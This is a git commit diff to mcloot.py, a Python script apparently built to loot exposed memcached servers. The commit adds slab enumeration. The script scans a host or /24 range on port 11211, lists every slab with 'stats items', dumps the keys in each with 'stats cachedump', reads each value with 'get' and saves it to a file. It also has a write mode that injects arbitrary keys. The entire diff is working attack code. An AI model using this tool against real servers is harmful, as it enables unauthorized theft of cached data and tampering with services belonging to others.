c7a8c317583bc9e54cdfd457e07901d1f5bb11f2
Andrusha <plastunovaa@gmail.com>
2014-12-02 01:23:22 +0300

    Added multiple slabs support

--- mcloot.py
+++ mcloot.py
@@ -16,9 +16,9 @@ def cmd():
 	parser.add_argument('-t','--target', required=True, help='Specify target. It can be single host, or range of hosts, separated by hyphen. For now, only /24 net will scan n')
 	parser.add_argument('-p','--port', default ="11211", help='Specify target port. By default 11211 is used\n')
 	parser.add_argument('-m','--mode', default = mode_info, choices=LOOTMODE, help='Specify working mode. By default it tries to read all the possible data')
-	parser.add_argument('-k','--key', default = None, help='Key to write data to')
-	parser.add_argument('-v','--value', default = None, help='Data to write for specified key')
-	parser.add_argument('-o','--output',required=True, help='File to write the output')
+	parser.add_argument('-k','--key', default = None, help='Required only for %s mode. Key to write data to' % (mode_write))
+	parser.add_argument('-v','--value', default = None, help='Required only for %s mode. Data to write for specified key' % (mode_write))
+	parser.add_argument('-o','--output', help='File to write the output')
 
 	args= parser.parse_args()
 
@@ -28,40 +28,38 @@ def cmd():
 	try:
 		int(port[1])
 	except ValueError:
-		print "[-]Incorrect port number: %s"%(port)
+		print "[-]Incorrect port number: %s" % (port)
 		sys.exit(-1)
 	if not 0 <= int(port) <= 65535:
-		print "[-]Incorrect port number: %s"%(port)
+		print "[-]Incorrect port number: %s" % (port)
 		sys.exit(-1)
 	#Maybe to perform some additional checks here
 
-	# Create adequate check for IP addresses
-	if 1 == 1:
-		IP_oct = target.split('.')
-		ipList = []
-		#Splitting second octed. Mask /24
-		mask_24 = IP_oct[3].split("-")
-		if len(mask_24) == 1:
-			ipList.append(target)
-		else:	
-			ranges_count = len(mask_24)/2
-			#TODO: Add parsing of other masks /16 /8 /0 
-			#TODO: Add parsing of hosts, separated by comma
-			for i in xrange(int(mask_24[0]),int(mask_24[1])):
-				ip = '.'.join((IP_oct[0],IP_oct[1],IP_oct[2],str(i)))
-				try:
-					IP(ip)
-				except ValueError:
-					print "[-]Incorrect ip address: %s"%(ip)
-					sys.exit(-1)
-				ipList.append(ip)
+	# Create adequate checks for IP addresses
+	IP_oct = target.split('.')
+	ipList = []
+	#Splitting second octed. Mask /24
+	mask_24 = IP_oct[3].split("-")
+	if len(mask_24) == 1:
+		ipList.append(target)
+	else:	
+		ranges_count = len(mask_24)/2
+		#TODO: Add parsing of other masks /16 /8 /0 
+		#TODO: Add parsing of hosts, separated by comma
+		for i in xrange(int(mask_24[0]), int(mask_24[1])):
+			ip = '.'.join((IP_oct[0], IP_oct[1], IP_oct[2], str(i)))
+			try:
+				IP(ip)
+			except ValueError:
+				print "[-]Incorrect ip address: %s" % (ip)
+				sys.exit(-1)
+			ipList.append(ip)
 
 	mode = args.mode
 
 	key, value = None, None
 	if (mode == mode_write):
-		key = args.key
-		value = args.value
+		key, value = args.key, args.value
 		if (key == None) or (value == None):
 			print "[-] Key and Value to write must be specified"
 			sys.exit(-1)
@@ -70,19 +68,36 @@ def cmd():
 			sys.exit(-1)
 
 	output = args.output
-
+	if (mode != mode_write) and (output == None):
+		print "[-] Output must be specified for mode %s" % (mode)
+		sys.exit(-1)
 	print "[!] Working mode: %s" % (mode)
 	print "[!] Target host(s): %s" % (target)
 	print "[!] Target port: %s" % (port)
 	return (ipList,int(port),mode,key,value,output)
 
+def parse_slabs(resp):
+	# The value, followed by "items" is slab number
+	#STAT items:1:number 3\r\n
+	#...
+	#STAT items:2:number 11\r\n
+	#...
+	#STAT items:3:number 1\r\n
+	#...
+	#END\r\n
+	resp_list = resp.split("\r\n")[:-2]
+	return list(set([x.strip("STAT ").split(":")[1] for x in resp_list]))
 
 def parse_key(resp):
-	key = None
-	value = None
+	key, value = None, None
 	resp_list = resp.split("\r\n")
 	try:
+		#Key is stored on first line
+		#VALUE <key> 0 <len(value)>\r\n
+		#<value>\r\n
+		#END\r\n
 		key = resp_list[0].split(" ")[1]
+		#And value is stored on second line
 		value = resp_list[1]
 	except:
 		return None,None
@@ -90,10 +105,12 @@ def parse_key(resp):
 
 def parse_stat(resp):
 	# [:-2] Because of END\r\n line
+	#STAT pid <pid>\r\n
+	#STAT uptime <uptime>\r\n
+	#...
+	#END\r\n
 	resp_list = resp.split("\r\n")[:-2]
 	return [x.strip("STAT ").split(" ") for x in resp_list]
-
-
 
 
 if __name__ == "__main__":
@@ -131,17 +148,27 @@ if __name__ == "__main__":
 			if toFile: f.write("\r\n[!] %s\r\n" % ip)
 			s = socket.socket()
 			s.connect((ip,port))
-			#First of all, we try to get all stored keys from memcached service
-			#stats cachedump - command for retrieving all the cached keys
-			mc_cmd = "stats cachedump 1 0\r\n"
+			#First of all, we try to read all the slabs, that can store valuable data
+			#stats items - command for retrieving info for all existing slabs
+			mc_cmd = "stats items\r\n"
 			s.send(mc_cmd)
 			resp = ""
-			resp = s.recv(1024)
-			# [:-2] Because of END\r\n line
-			for item in resp.split("\r\n")[:-2]:
-				keys.append(item.split(" ")[1])
-			print "\t\t[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
-			#Second, we try to read value for each found key
+			resp = s.recv(4096)
+			#Second thing is to read
+
+			slabs = parse_slabs(resp)
+			#Second, we try to get all stored keys from each founded slab
+			#stats cachedump - command for retrieving all the cached keys from a single slab
+			for slab in slabs:			
+				mc_cmd = "stats cachedump %s 0\r\n" % (slab)
+				s.send(mc_cmd)
+				resp = ""
+				resp = s.recv(1024)
+				# [:-2] Because of END\r\n line
+				for item in resp.split("\r\n")[:-2]:
+					keys.append(item.split(" ")[1])
+				print "\t\t[+]Found %d items in slab %s: %s" % (len(keys),slab , ', '.join((keys)))
+			#And last, we'll try to read each key's value
 			for key in keys:
 				#get - command to retrieve specified's key value
 				mc_cmd = "get %s\r\n" % (key)
